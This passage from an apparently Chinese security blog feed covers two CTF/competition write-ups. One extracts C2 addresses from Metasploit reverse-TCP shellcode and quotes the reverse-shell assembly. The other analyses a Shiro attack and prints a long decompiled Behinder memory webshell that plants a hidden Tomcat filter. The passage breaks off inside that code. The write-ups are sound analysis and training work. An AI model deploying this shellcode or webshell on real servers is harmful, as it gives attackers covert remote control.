4444</span><br><span class="line">  mov esi, esp           ; save pointer to sockaddr struct</span><br><span class="line">  </span><br><span class="line">try_connect:</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  push esi               ; pointer to the sockaddr struct</span><br><span class="line">  push edi               ; the socket</span><br><span class="line">  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call ebp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line"></span><br><span class="line">  test eax,eax           ; non-zero means a failure</span><br><span class="line">  jz short connected</span><br><span class="line"></span><br><span class="line">handle_failure:</span><br><span class="line">  dec dword [esi+8]</span><br><span class="line">  jnz short try_connect</span><br><span class="line"></span><br><span class="line">failure:</span><br><span class="line">  push 0x56A2B5F0        ; hardcoded to exitprocess for size</span><br><span class="line">  call ebp</span><br><span class="line"></span><br><span class="line">connected:</span><br></pre></td></tr></table></figure><p>可以看到这个文件执行的主要操作就是加载ws2_32.dll这个库，ws2_32.dll中提供了socket连接相关的功能。</p><p>其中可以看到在set_address一节中有如下两条汇编指令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">push 0x5C110002        ; family AF_INET and port 4444</span><br></pre></td></tr></table></figure><p>这两条指令代表了将要连接的ip和port入栈，据此，如果攻击者没有魔改过Metasploit，我们只需根据其前后的特征码去匹配，将中间的这两条汇编指令提取出来即可。我们可以用Metasploit生成一段纯shellcode，然后将其载入ida中观察，可以发现IP和端口的信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:00000095 sub_95          proc near</span><br><span class="line">seg000:00000095</span><br><span class="line">seg000:00000095 var_22C         &#x3D; dword ptr -22Ch</span><br><span class="line">seg000:00000095</span><br><span class="line">seg000:00000095                 pop     ebp</span><br><span class="line">seg000:00000096                 push    3233h</span><br><span class="line">seg000:0000009B                 push    5F327377h</span><br><span class="line">seg000:000000A0                 push    esp</span><br><span class="line">seg000:000000A1                 push    726774Ch</span><br><span class="line">seg000:000000A6                 mov     eax, ebp</span><br><span class="line">seg000:000000A8                 call    eax</span><br><span class="line">seg000:000000AA                 mov     eax, 190h</span><br><span class="line">seg000:000000AF                 sub     esp, eax</span><br><span class="line">seg000:000000B1                 push    esp</span><br><span class="line">seg000:000000B2                 push    eax</span><br><span class="line">seg000:000000B3                 push    6B8029h</span><br><span class="line">seg000:000000B8                 call    ebp</span><br><span class="line">seg000:000000BA                 push    0Ah</span><br><span class="line">seg000:000000BC</span><br><span class="line">seg000:000000BC loc_BC:                                 ; CODE XREF: sub_95+B1↓j</span><br><span class="line">seg000:000000BC                 push    100007Fh# C2地址</span><br><span class="line">seg000:000000C1                 push    5C110002h# 端口</span><br><span class="line">seg000:000000C6                 mov     esi, esp</span><br><span class="line">seg000:000000C8                 push    eax</span><br><span class="line">seg000:000000C9                 push    eax</span><br><span class="line">seg000:000000CA                 push    eax</span><br><span class="line">seg000:000000CB                 push    eax</span><br><span class="line">seg000:000000CC                 inc     eax</span><br><span class="line">seg000:000000CD                 push    eax</span><br><span class="line">seg000:000000CE                 inc     eax</span><br><span class="line">seg000:000000CF                 push    eax</span><br><span class="line">seg000:000000D0                 push    0E0DF0FEAh</span><br><span class="line">seg000:000000D5                 call    ebp</span><br><span class="line">seg000:000000D7                 xchg    eax, edi</span><br></pre></td></tr></table></figure><p>得到C2地址：7F 00 00 01 = 127.0.0.1</p><p>得到端口：02 00 <strong>11 5C</strong> = 4444</p><p>提取脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_config_32</span>(<span class="params">data</span>):</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">sorted</span>(data.items()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="comment"># push xxx</span></span><br><span class="line">        <span class="keyword">if</span> data[i][<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;push&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(data[i][<span class="number">1</span>][<span class="number">1</span>]) &gt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;push&#x27;</span> <span class="keyword">and</span> data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>][-<span class="number">4</span>:] == <span class="string">&#x27;0002&#x27;</span>:</span><br><span class="line">                ip = (<span class="number">8</span> - <span class="built_in">len</span>(data[i][<span class="number">1</span>][<span class="number">1</span>][<span class="number">2</span>:])) * <span class="string">&#x27;0&#x27;</span> + data[i][<span class="number">1</span>][<span class="number">1</span>][<span class="number">2</span>:]  <span class="comment"># 补齐ip地址为8个16进制数</span></span><br><span class="line">                ip_4 = <span class="built_in">int</span>(ip[<span class="number">0</span>:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">                ip_3 = <span class="built_in">int</span>(ip[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">                ip_2 = <span class="built_in">int</span>(ip[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">                ip_1 = <span class="built_in">int</span>(ip[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">                echo(<span class="string">&#x27;ip地址：&#x27;</span> + <span class="built_in">str</span>(ip_1) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(ip_2) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(ip_3) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(ip_4))</span><br><span class="line">                port = data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>][<span class="number">4</span>:<span class="number">6</span>] + data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>][<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">                echo(<span class="string">&#x27;端口：&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(port, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>对于x64架构的C2配置提取，也采取同样思路，其中连接建立过程的汇编代码见：<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2003</span><br><span class="line">; Architecture: x64</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">; Input: RBP must be the address of &#39;api_call&#39;.</span><br><span class="line">; Output: RDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  ; setup the structures we need on the stack...</span><br><span class="line">  mov r14, &#39;ws2_32&#39;</span><br><span class="line">  push r14               ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov r12, 0x0100007F5C110002        </span><br><span class="line">push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br></pre></td></tr></table></figure><p>IP信息和端口信息会被存入r12寄存器</p><p>提取思路同32位</p><p>参考链接：</p><p><a href="https://docs.metasploit.com/">Metasploit Documentation </a></p><p><a href="https://www.unicorn-engine.org/">Unicorn</a></p><p><a href="https://linasm.sourceforge.net/docs/instructions/fpu.php">Floating-Point Unit (FPU) instructions set</a></p><p><a href="https://www.anquanke.com/post/id/238645">SMC自解码总结</a></p><p><a href="https://wonderkun.cc/2021/04/25/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-metasploit%E7%9A%84shellcode%E5%88%86%E6%9E%90(%E4%B8%89">杀软的无奈-metasploit的shellcode loader分析(三)</a>)</p><p><a href="https://bbs.kanxue.com/thread-256000-1.htm">如何编写shellcode获取EIP</a></p><p><a href="https://mp.weixin.qq.com/s/PM9tw1hXNEMqQq9vrK45kw">DataCon2023软件安全赛道，冠军战队WP分享</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯被薄纱之旅</title>
      <link href="2023/09/16/LJB-2023/"/>
      <url>2023/09/16/LJB-2023/</url>
      
        <content type="html"><![CDATA[<p>👴🏻🚪被打傻了，👴🏻感觉👴🏻是个five</p><h1 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h1><p><img src="https://s2.loli.net/2023/09/16/sdq5uDwl2rFceH7.png" alt=""></p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="soeasy-2"><a href="#soeasy-2" class="headerlink" title="soeasy-2"></a>soeasy-2</h3><p>流量中发现一段加密脚本如下：</p><p><img src="https://s2.loli.net/2023/09/16/mVJwMKAHgEXlD85.png" alt=""></p><p>然后传了一段私钥：</p><p><img src="https://s2.loli.net/2023/09/16/w92TRQmSfv36ibJ.png" alt=""></p><p>一段密文：</p><p><img src="https://s2.loli.net/2023/09/16/XVgm9t16v7IUOqB.png" alt=""></p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_message</span>(<span class="params">message, private</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        private_key = RSA.import_key(f.read())</span><br><span class="line">    cipher = PKCS1_OAEP.new(private_key)</span><br><span class="line">    flag = cipher.decrypt(message)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">message = base64.b64decode(<span class="string">&#x27;TtmVmEmRb1pTIGlnzeckFvPsrYdn/jf4hHMgzw0uazvGFdkbZGUKSbm+husz8QX/KqRttzUJZudzPHskqp+WuIKqpN5X1/xoiikAhJQXWUvuvY+dJaYXvHe5Ir7VdEaZJB0XjgteYXVLSYACZ88TMvGeZdnbHP0VIr5ltCBl97z5XO+SYABXG7BqME7zg+GKdyj/HsaCd7+9RR9ufJiPZ90qSiZ4f3tHH2Y7LNzPdi4wClTOFJILP7w7/+06sbvt2a4A69yaDcM5vS4W2Cw2VzJe+FTMOeKl2w86FzGBjuX0MYr8UEhS4ODXVr/DePAiRvYKpJ9OVYCWhlQhMLYWYg==&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decrypt_message(message, <span class="string">&#x27;/Users/lemon/Desktop/pwn/pwn-enclosure/3-compi/rhg/流量分析/private_key&#x27;</span>)</span><br></pre></td></tr></table></figure><p>因为密文是二进制数据，所以可以先按YAML提取，然后在message字段进行base64 decode</p><h3 id="easy-shiro1、3"><a href="#easy-shiro1、3" class="headerlink" title="easy_shiro1、3"></a>easy_shiro1、3</h3><p>最后上了三道shiro题，👴🏻🚪因为没有shiro密钥的解密工具忘题兴叹，👴🏻记得shiro-550的密钥是写死的，但是没有shiro文档，👴🏻🚪又不出网，所以以为这几个shiro没救了。</p><p>但是👴🏻灵机一动，👴🏻今年hw搞到了一套武器库，👴🏻翻了翻，发现有这么个玩意：</p><p><img src="https://s2.loli.net/2023/09/16/dDn1HTSMwX8Ovqg.png" alt=""></p><p>好活，内存马反编译和shiro解密都有，彳亍</p><p><img src="https://s2.loli.net/2023/09/16/8ngx6rEHeDJ9CSs.png" alt=""></p><p>看原始日志，发现这一段的cookie已经很不正常了，并且状态码还是200，拿去解下：</p><p><img src="https://s2.loli.net/2023/09/16/EGhfnbIotXlspWL.png" alt=""></p><p>得到了shiro密钥，然后发现后面有个user参数，传了一堆奇怪的东西</p><p><img src="https://s2.loli.net/2023/09/16/74tU6GNg1LqcfjZ.png" alt=""></p><p>猜测是内存🐴，拿去跑下</p><p>反编译出如下结果：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.summersec.x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.DispatcherType;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponseWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterRegistration.Dynamic;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.util.LifecycleBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">BehinderFilter</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> HttpServletRequest request = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> HttpServletResponse response = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> String cs = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String Pwd = <span class="string">&quot;eac9fa38330a7535&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String path = <span class="string">&quot;/favicondemo.ico&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BehinderFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BehinderFilter</span><span class="params">(ClassLoader c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String ret = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest m = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = (<span class="keyword">new</span> BigInteger(<span class="number">1</span>, m.digest())).toString(<span class="number">16</span>).substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.parseObj(obj);</span><br><span class="line">        <span class="keyword">this</span>.Pwd = md5(<span class="keyword">this</span>.request.getHeader(<span class="string">&quot;p&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.path = <span class="keyword">this</span>.request.getHeader(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        StringBuffer output = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String tag_s = <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line">        String tag_e = <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.request.setCharacterEncoding(<span class="keyword">this</span>.cs);</span><br><span class="line">            <span class="keyword">this</span>.response.setCharacterEncoding(<span class="keyword">this</span>.cs);</span><br><span class="line">            output.append(<span class="keyword">this</span>.addFilter());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            output.append(<span class="string">&quot;ERROR:// &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.response.getWriter().print(tag_s + output.toString() + tag_e);</span><br><span class="line">            <span class="keyword">this</span>.response.getWriter().flush();</span><br><span class="line">            <span class="keyword">this</span>.response.getWriter().close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseObj</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.getClass().isArray()) &#123;</span><br><span class="line">            Object[] data = (Object[])((Object[])((Object[])obj));</span><br><span class="line">            <span class="keyword">this</span>.request = (HttpServletRequest)data[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">this</span>.response = (HttpServletResponse)data[<span class="number">1</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clazz = Class.forName(<span class="string">&quot;javax.servlet.jsp.PageContext&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.request = (HttpServletRequest)clazz.getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(obj);</span><br><span class="line">                <span class="keyword">this</span>.response = (HttpServletResponse)clazz.getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> HttpServletRequest) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.request = (HttpServletRequest)obj;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Field req = <span class="keyword">this</span>.request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        req.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        HttpServletRequest request2 = (HttpServletRequest)req.get(<span class="keyword">this</span>.request);</span><br><span class="line">                        Field resp = request2.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                        resp.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        <span class="keyword">this</span>.response = (HttpServletResponse)resp.get(request2);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">this</span>.response = (HttpServletResponse)<span class="keyword">this</span>.request.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">addFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ServletContext servletContext = <span class="keyword">this</span>.request.getServletContext();</span><br><span class="line">        Filter filter = <span class="keyword">this</span>;</span><br><span class="line">        String filterName = <span class="keyword">this</span>.path;</span><br><span class="line">        String url = <span class="keyword">this</span>.path;</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(filterName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Field contextField = <span class="keyword">null</span>;</span><br><span class="line">            ApplicationContext applicationContext = <span class="keyword">null</span>;</span><br><span class="line">            StandardContext standardContext = <span class="keyword">null</span>;</span><br><span class="line">            Field stateField = <span class="keyword">null</span>;</span><br><span class="line">            Dynamic filterRegistration = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            String var11;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                applicationContext = (ApplicationContext)contextField.get(servletContext);</span><br><span class="line">                contextField = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                standardContext = (StandardContext)contextField.get(applicationContext);</span><br><span class="line">                stateField = LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(filterName, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), <span class="keyword">false</span>, <span class="keyword">new</span> String[]&#123;url&#125;);</span><br><span class="line">                Method filterStartMethod = StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, (Object[])<span class="keyword">null</span>);</span><br><span class="line">                stateField.set(standardContext, LifecycleState.STARTED);</span><br><span class="line">                var11 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                Class filterMap;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">                    filterMap = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Method findFilterMaps = standardContext.getClass().getMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">                Object[] filterMaps = (Object[])((Object[])((Object[])findFilterMaps.invoke(standardContext)));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; ++i) &#123;</span><br><span class="line">                    Object filterMapObj = filterMaps[i];</span><br><span class="line">                    findFilterMaps = filterMap.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                    String name = (String)findFilterMaps.invoke(filterMapObj);</span><br><span class="line">                    <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                        filterMaps[<span class="number">0</span>] = filterMapObj;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String var25 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">                String var26 = var25;</span><br><span class="line">                <span class="keyword">return</span> var26;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                var11 = var23.getMessage();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext, LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var11;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Filter already exists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpSession session = ((HttpServletRequest)req).getSession();</span><br><span class="line">        Object lastRequest = req;</span><br><span class="line">        Object lastResponse = resp;</span><br><span class="line">        Method getResponse;</span><br><span class="line">        <span class="keyword">if</span> (!(req <span class="keyword">instanceof</span> RequestFacade)) &#123;</span><br><span class="line">            getResponse = 